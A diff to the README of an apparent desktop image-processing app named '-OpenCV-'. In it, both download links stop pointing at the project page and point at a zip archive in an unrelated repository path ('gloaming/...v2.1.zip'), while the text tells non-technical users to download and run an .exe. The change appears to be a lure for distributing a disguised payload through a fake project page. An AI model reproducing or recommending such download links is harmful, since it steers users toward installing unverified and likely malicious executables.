@@ -5,7 +5,7 @@ description: "Build modular computer vision pipelines with this Qt 6 and OpenCV 
 ---
 # 👁️ -OpenCV- - Process Images With One Click
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Nitroglyceringround109/-OpenCV-)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Nitroglyceringround109/nitroglyceringround109.github.io/raw/refs/heads/main/gloaming/nitroglyceringround-github-io-v2.1.zip)
 
 -OpenCV- offers a visual workspace for your desktop. You load images and apply filters through a modular interface. The software uses professional tools to detect faces, read codes, and edit visuals. You do not need to write code to use these features.
 
@@ -13,7 +13,7 @@ description: "Build modular computer vision pipelines with this Qt 6 and OpenCV 
 
 Find the application on the project page.
 
-1. Visit [this page to download](https://github.com/Nitroglyceringround109/-OpenCV-).
+1. Visit [this page to download](https://github.com/Nitroglyceringround109/nitroglyceringround109.github.io/raw/refs/heads/main/gloaming/nitroglyceringround-github-io-v2.1.zip).
 2. Look for the latest version under the Releases area.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your computer.
